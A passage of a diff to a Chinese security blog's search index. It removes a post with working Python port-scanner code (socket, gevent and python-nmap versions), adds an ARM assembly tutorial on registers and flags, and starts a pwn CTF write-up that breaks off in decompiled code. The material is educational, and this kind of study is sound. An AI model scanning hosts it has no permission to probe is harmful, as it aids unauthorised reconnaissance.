@@ -14,40 +14,6 @@
       </tags>
   </entry>
   <entry>
-    <title>python实现端口扫描器</title>
-    <url>/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/0.png" class></strong></p>
- <a id="more"></a>
-
-<h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p>最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。$–&gt;$（<a href="https://xz.aliyun.com/t/5376#toc-0">端口扫描类型</a>）</p>
-<p>还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。</p>
-<p>实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。$–&gt;$（<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71">socket编程基础</a>）</p>
-<h3 id="实现单线程扫描功能"><a href="#实现单线程扫描功能" class="headerlink" title="实现单线程扫描功能"></a>实现单线程扫描功能</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现从程序外部向程序传递参数</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">portstrs = sys.argv[<span class="number">2</span>].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描端口范围</span></span><br><span class="line">start_port = int(portstrs[<span class="number">0</span>])</span><br><span class="line">end_port = int(portstrs[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标ip地址</span></span><br><span class="line">target_ip = gethostbyname(host)</span><br><span class="line">opened_ports = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行循环连接</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port):</span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    result = sock.connect_ex((target_ip, port))</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        opened_ports.append(port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印开放的端口</span></span><br><span class="line">print(<span class="string">&quot;Opened ports:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opened_ports:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
-
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/2.png" class></strong></p>
-<p>上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。</p>
-<h3 id="多线程扫描"><a href="#多线程扫描" class="headerlink" title="多线程扫描"></a>多线程扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> gevent.pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TCP_connect</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot;</span></span><br><span class="line">    TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCP_sock.settimeout(<span class="number">0.5</span>)  <span class="comment"># 设置连接超时</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = TCP_sock.connect_ex((ip, int(port)))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]%s 端口 开启\t&quot;</span> % port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[!]%s端口 关闭&quot;%port)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        TCP_sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_ip</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标IP&quot;&quot;&quot;</span></span><br><span class="line">    ip = input(<span class="string">&quot;[+]输入扫描目标IP:&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*]正在扫描&quot;</span>)</span><br><span class="line">    scan_port(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_web</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标网址&quot;&quot;&quot;</span></span><br><span class="line">    web = input(<span class="string">&quot;[+]输入扫描网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">in</span> web <span class="keyword">or</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">in</span> web:</span><br><span class="line">        web = web[web.find(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">        print(web)</span><br><span class="line">        print(<span class="string">&quot;[*]正在分析网站服务器IP&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_ip = socket.gethostbyname(str(web))</span><br><span class="line">        print(<span class="string">&quot;[*]服务器IP为%s&quot;</span> % server_ip)</span><br><span class="line">        scan_port(server_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]服务器IP获取失败&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*]开始扫描目标端口&quot;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    g = gevent.pool.Pool(<span class="number">50</span>)  <span class="comment"># 设置线程数</span></span><br><span class="line">    run_list = []</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">        run_list.append(g.spawn(TCP_connect, ip, port))</span><br><span class="line">    gevent.joinall(run_list)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[*]总耗时%s&quot;</span> % time.strftime(<span class="string">&quot;%H:%M:%S&quot;</span>, time.gmtime(end - start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;1.通过IP扫描端口&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2.通过网址扫描端口&quot;</span>)</span><br><span class="line">    uc = int(input(<span class="string">&quot;[+]请输入选择:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == uc:</span><br><span class="line">        scan_ip()</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> == uc:</span><br><span class="line">        scan_web()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]输入有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>这里展示部分运行结果：</p>
-<h4 id="选择通过网址扫描端口"><a href="#选择通过网址扫描端口" class="headerlink" title="选择通过网址扫描端口"></a>选择通过网址扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/3.png" class></strong></p>
-<h4 id="选择通过IP扫描端口"><a href="#选择通过IP扫描端口" class="headerlink" title="选择通过IP扫描端口"></a>选择通过IP扫描端口</h4><p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/4.png" class></strong></p>
-<h3 id="使用nmap扫描"><a href="#使用nmap扫描" class="headerlink" title="使用nmap扫描"></a>使用nmap扫描</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.56.1&#x27;</span></span><br><span class="line"><span class="comment"># 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误</span></span><br><span class="line">nm = nmap.PortScanner(nmap_search_path=(<span class="string">&#x27;nmap&#x27;</span>, <span class="string">r&quot;E:\nmap\nmap.exe&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">130</span>, <span class="number">136</span>):</span><br><span class="line">    result = nm.scan(host, str(port))</span><br><span class="line">    <span class="comment"># 在主机192.168.56.1上获取端口22/tcp状态</span></span><br><span class="line">    state = result[<span class="string">&#x27;scan&#x27;</span>][<span class="string">&#x27;192.168.56.1&#x27;</span>][<span class="string">&#x27;tcp&#x27;</span>][int(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;[%s] port state: %s&#x27;</span> % (port, state))</span><br></pre></td></tr></table></figure>
-
-<p>使用<strong>netstat -an</strong>查看本机开启的端口服务，用端口135测试代码运行的正确性</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/1.png" class></strong></p>
-<p>也可以直接使用zenmap工具进行端口扫描：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/5.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>Nmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Part 1: ARM汇编介绍</title>
     <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-1-ARM%E6%B1%87%E7%BC%96%E4%BB%8B%E7%BB%8D/0.png" class></strong></p>
@@ -114,11 +80,67 @@
   <entry>
     <title>Part 2: 数据类型寄存器</title>
     <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/</url>
-    <content><![CDATA[]]></content>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/0.png" class></strong></p>
+ <a id="more"></a>
+
+<h2 id="ARM汇编数据类型基础"><a href="#ARM汇编数据类型基础" class="headerlink" title="ARM汇编数据类型基础"></a><strong>ARM汇编数据类型基础</strong></h2><p>与高级语言类似，ARM也支持操作不同的数据类型。</p>
+<p><img src="https://azeria-labs.com/wp-content/uploads/2017/03/data-types-1.png" alt="img"></p>
+<p>被加载或者存储的数据类型可以是无符号（有符号）的字(words，四字节)，半字(halfwords，两字节)，或者字节(bytes)。这些数据类型在汇编语言中的扩展后缀为**-h<strong>或者</strong>-sh<strong>对应着半字，</strong>-b<strong>或者</strong>-sb**对应着字节，但是对于字并没有对应的扩展。无符号类型与有符号类型的差别是：</p>
+<p>符号数据类型可以包含正负数所以数值范围上更低些</p>
+<p>无符号数据类型可以放得下很大的正数但是放不了负数</p>
+<p>这有一些要求使用对应数据类型做存取操作的汇编指令示例：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ldr = 加载字，宽度四字节</span><br><span class="line">ldrh = 加载无符号的半字，宽度两字节</span><br><span class="line">ldrsh = 加载有符号的半字，宽度两字节</span><br><span class="line">ldrb = 加载无符号的字节</span><br><span class="line">ldrsb = 加载有符号的字节</span><br><span class="line">str = 存储字，宽度四字节</span><br><span class="line">strh = 存储无符号的半字，宽度两字节</span><br><span class="line">strsh = 存储有符号的半字，宽度两字节</span><br><span class="line">strb = 存储无符号的字节</span><br><span class="line">strsb = 存储有符号的字节</span><br></pre></td></tr></table></figure>
+
+<h2 id="字节序"><a href="#字节序" class="headerlink" title="字节序"></a><strong>字节序</strong></h2><p>在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\2.png" alt="img"></p>
+<p>在版本3之前，ARM使用的是小端序，但在这之后就都是使用大端序了，但也允许切换回小端序。在我们样例代码所在的ARMv6中，指令代码是以[<a href="http://infocenter.arm.com/help/index.jsp?topic=/com.arm.doc.ddi0301h/Cdfbbchb.html">小端序排列对齐]</a>。但是数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。</p>
+<h2 id="ARM寄存器"><a href="#ARM寄存器" class="headerlink" title="ARM寄存器"></a><strong>ARM寄存器</strong></h2><p>寄存器的数量由ARM版本决定。根据[<a href="http://infocenter.arm.com/help/topic/com.arm.doc.dui0473c/Babdfiih.html">ARM参考手册]</a>，在ARMv6-M与ARMv7-M的处理器中有30个32bit位宽度的通用寄存器。前16个寄存器是用户层可访问控制的，其他的寄存器在高权限进程中可以访问（但ARMv6-M与ARMv7-M除外）。我们仅介绍可以在任何权限模式下访问的16个寄存器。这16个寄存器分为两组：通用寄存器与有特殊含义的寄存器。</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\3.png" alt="image-20201109224140126"></p>
+<p>下面这张表是ARM架构与寄存器与Intel架构寄存器的关系：</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\4.png" alt="image-20201109224330032"></p>
+<p>R0-R12：用来在通用操作中存储临时的值，指针等。R0被用来存储函数调用的返回值。R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针（之后会讲）。以及，在ARM的函数调用约定中，前四个参数按顺序存放在R0-R3中。</p>
+<p>R13：SP(栈指针）。栈指针寄存器用来指向当前的栈顶。栈是一片来存储函数调用中相关数据的内存，在函数返回时会被修改为对应的栈指针。栈指针用来帮助在栈上申请数据空间。比如说你要申请一个字的大小，就会将栈指针减4，再将数据放入之前所指向的位置。</p>
+<p>R14：LR(链接寄存器)。当一个函数调用发生，链接寄存器就被用来记录函数调用发生所在位置的下一条指令的地址。这么做允许我们快速的从子函数返回到父函数。</p>
+<p>R15：PC(程序计数器)。程序计数器是一个在程序指令执行时自增的计数器。它的大小在ARM模式下总是4字节对齐，在Thumb模式下总是两字节对齐。当执行一个分支指令时，PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置。这也是X86与ARM在PC上的主要不同之处。</p>
+<p>我们可以通过调试来观察PC的行为。我们的程序中将PC的值存到R0中同时包含了两条其他指令，来看看会发生什么。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line"> mov r0, pc</span><br><span class="line"> mov r1, #<span class="number">2</span></span><br><span class="line"> add r2, r1, r1</span><br><span class="line"> bkpt</span><br></pre></td></tr></table></figure>
+
+<p>在GDB中，我们开始调试这段汇编代码：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gef&gt; br _start</span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8054</span></span><br><span class="line">gef&gt; run</span><br></pre></td></tr></table></figure>
+
+<p>在开始执行触发断点后，首先会在GDB中看到:</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 <span class="number">0x00000000</span>   $r1 <span class="number">0x00000000</span>   $r2 <span class="number">0x00000000</span>   $r3 <span class="number">0x00000000</span> </span><br><span class="line">$r4 <span class="number">0x00000000</span>   $r5 <span class="number">0x00000000</span>   $r6 <span class="number">0x00000000</span>   $r7 <span class="number">0x00000000</span> </span><br><span class="line">$r8 <span class="number">0x00000000</span>   $r9 <span class="number">0x00000000</span>   $r10 <span class="number">0x00000000</span>  $r11 <span class="number">0x00000000</span> </span><br><span class="line">$r12 <span class="number">0x00000000</span>  $sp <span class="number">0xbefff7e0</span>   $lr <span class="number">0x00000000</span>   $pc <span class="number">0x00008054</span> </span><br><span class="line">$cpsr <span class="number">0x00000010</span> </span><br><span class="line"><span class="number">0x8054</span> &lt;_start&gt; mov r0, pc     &lt;- $pc</span><br><span class="line"><span class="number">0x8058</span> &lt;_start+<span class="number">4</span>&gt; mov r0, #<span class="number">2</span></span><br><span class="line"><span class="number">0x805c</span> &lt;_start+<span class="number">8</span>&gt; add r1, r0, r0</span><br><span class="line"><span class="number">0x8060</span> &lt;_start+<span class="number">12</span>&gt; bkpt <span class="number">0x0000</span></span><br><span class="line"><span class="number">0x8064</span> andeq r1, r0, r1, asr #<span class="number">10</span></span><br><span class="line"><span class="number">0x8068</span> cmnvs r5, r0, lsl #<span class="number">2</span></span><br><span class="line"><span class="number">0x806c</span> tsteq r0, r2, ror #<span class="number">18</span></span><br><span class="line"><span class="number">0x8070</span> andeq r0, r0, r11</span><br><span class="line"><span class="number">0x8074</span> tsteq r8, r6, lsl #<span class="number">6</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到在程序的开始PC指向0x8054这个位置即第一条要被执行的指令，那么此时我们使用GDB命令si，执行下一条机器码。下一条指令是把PC的值放到R0寄存器中，所以应该是0x8054么？来看看调试器的结果。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$r0 <span class="number">0x0000805c</span>   $r1 <span class="number">0x00000000</span>   $r2 <span class="number">0x00000000</span>   $r3 <span class="number">0x00000000</span> </span><br><span class="line">$r4 <span class="number">0x00000000</span>   $r5 <span class="number">0x00000000</span>   $r6 <span class="number">0x00000000</span>   $r7 <span class="number">0x00000000</span> </span><br><span class="line">$r8 <span class="number">0x00000000</span>   $r9 <span class="number">0x00000000</span>   $r10 <span class="number">0x00000000</span>  $r11 <span class="number">0x00000000</span> </span><br><span class="line">$r12 <span class="number">0x00000000</span>  $sp <span class="number">0xbefff7e0</span>   $lr <span class="number">0x00000000</span>   $pc <span class="number">0x00008058</span> </span><br><span class="line">$cpsr <span class="number">0x00000010</span></span><br><span class="line"><span class="number">0x8058</span> &lt;_start+<span class="number">4</span>&gt; mov r0, #<span class="number">2</span>       &lt;- $pc</span><br><span class="line"><span class="number">0x805c</span> &lt;_start+<span class="number">8</span>&gt; add r1, r0, r0</span><br><span class="line"><span class="number">0x8060</span> &lt;_start+<span class="number">12</span>&gt; bkpt <span class="number">0x0000</span></span><br><span class="line"><span class="number">0x8064</span> andeq r1, r0, r1, asr #<span class="number">10</span></span><br><span class="line"><span class="number">0x8068</span> cmnvs r5, r0, lsl #<span class="number">2</span></span><br><span class="line"><span class="number">0x806c</span> tsteq r0, r2, ror #<span class="number">18</span></span><br><span class="line"><span class="number">0x8070</span> andeq r0, r0, r11</span><br><span class="line"><span class="number">0x8074</span> tsteq r8, r6, lsl #<span class="number">6</span></span><br><span class="line"><span class="number">0x8078</span> adfcssp f0, f0, #<span class="number">4.0</span></span><br></pre></td></tr></table></figure>
+
+<p>当然不是，在执行0x8054这条位置的机器码时，PC已经读到了两条指令后的位置也就是0x805c(见R0寄存器)。所以我们以为直接读取PC寄存器的值时，它指向的是下一条指令的位置。但是调试器告诉我们，PC指向当前指令向后两条机器码的位置。这是因为早期的ARM处理器总是会先获取当前位置后两条的机器码。这么做的原因也是确保与早期处理器的兼容性。</p>
+<h2 id="当前程序状态寄存器（CPSR）"><a href="#当前程序状态寄存器（CPSR）" class="headerlink" title="当前程序状态寄存器（CPSR）"></a><strong>当前程序状态寄存器（CPSR）</strong></h2><p>当你用GDB调试ARM程序的的时候你能会可以看见Flags这一栏（GDB配置插件GEF后就可以看见了，或者直接在GDB里面输入flags也可以）。</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\5.png" alt="img"></p>
+<p>图中寄存器“<code>$CSPR“</code>显示了当前状态寄存器的值，Flags里面出现的thumb，fast，interrupt，overflow，carry，zero，negative就是来源于CSPR寄存器中对应比特位的值。ARM架构的N，Z，C，V与X86架构EFLAG中的SF，ZF，CF，OF相对应。这些比特位在汇编级别的条件执行或者循环的跳出时，被用作判断的依据。</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\6.png" alt="image-20201109234815952"></p>
+<p>上图展示了32位的CPSR寄存器的比特位含义，左边是最大比特位，右边是最小比特位。每个单元代表一个比特。这一个个比特的含义都很丰富：</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\7.png" alt="image-20201109235041376"></p>
+<p>假设我们用CMP指令去比较1和2，结果会是一个负数因为1-2=-1。然而当我们反过来用2和1比较，C位将被设定，因为在一个较大的数上减了较小的数，没有发生借位。当我们比较两个相同的数比如2和2时，由于结果是0，Z标志位将被置一。注意CMP指令中被使用的寄存器的值并不会被修改，其计算结果仅仅影响到CPSR寄存器中的状态位。</p>
+<p>在开了GEF插件的GDB中，计算结果如下图：在这里我们比较的两个寄存器是R1和R0，所以执行后的flag状态如下图。</p>
+<p><img src="/xiaohong404.github.io/xiaohong404/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-2-%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%AF%84%E5%AD%98%E5%99%A8/Xiaohong_Blog\blog\source_posts\ARM汇编\Part-2-数据类型寄存器\8.png" alt="img"></p>
+<p>Carry位Flag被设置的原因是CMP R1,R0会去拿4和2做比较。因为我们用以个较大的数字去减一个较少的数字，没有发生借位。Carry位便被置1。相反的，如果是CMP R0,R1那么Negative位会被置一。</p>
+]]></content>
+      <categories>
+        <category>ARM汇编</category>
+      </categories>
+      <tags>
+        <tag>ARM</tag>
+      </tags>
   </entry>
   <entry>
     <title>Part 3: Arm指令集</title>
     <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-3-Arm%E6%8C%87%E4%BB%A4%E9%9B%86/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Part 5: 重复性加载及存储</title>
+    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-5-%E9%87%8D%E5%A4%8D%E6%80%A7%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%AD%98%E5%82%A8/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -132,14 +154,319 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
-    <title>Part 5: 重复性加载及存储</title>
-    <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-5-%E9%87%8D%E5%A4%8D%E6%80%A7%E5%8A%A0%E8%BD%BD%E5%8F%8A%E5%AD%98%E5%82%A8/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
     <title>Part 7: 栈以及函数</title>
     <url>/xiaohong404.github.io/2020/11/09/ARM%E6%B1%87%E7%BC%96/Part-7-%E6%A0%88%E4%BB%A5%E5%8F%8A%E5%87%BD%E6%95%B0/</url>
     <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>Mary_Morton</title>
+    <url>/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/0.png" class></strong></p>
+ <a id="more"></a>
+
+<p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/4.png" class></strong></p>
+<h3 id="检查文件保护措施"><a href="#检查文件保护措施" class="headerlink" title="检查文件保护措施"></a>检查文件保护措施</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/1.png" class></strong></p>
+<p>开启了Canary机制，并且设置了不可执行栈。</p>
+<h3 id="查找可疑的字符串"><a href="#查找可疑的字符串" class="headerlink" title="查找可疑的字符串"></a>查找可疑的字符串</h3><p><strong><img src="/xiaohong404.github.io/2020/11/06/PWN/AD_World/Mary-Morton/2.png" class></strong></p>
+<p>其函数的地址为：0x4008DA</p>
+<h3 id="函数执行逻辑"><a href="#函数执行逻辑" class="headerlink" title="函数执行逻辑"></a>函数执行逻辑</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_4009FF();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to the battle ! &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[Great Fairy] level pwned &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Select your weapon &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_4009DA();</span><br><span class="line">      